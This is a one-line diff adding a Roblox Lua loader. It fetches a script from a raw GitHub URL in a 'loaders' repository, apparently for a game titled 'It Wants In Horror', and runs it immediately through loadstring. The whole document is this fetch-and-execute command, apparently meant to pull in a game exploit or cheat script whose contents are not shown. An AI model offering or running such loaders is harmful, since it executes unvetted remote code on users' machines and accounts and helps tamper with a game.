@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pitroninrank/loaders/main/loaders/it-wants-in-horror-spam4-vya86ij7h0e3yb.lua"))()
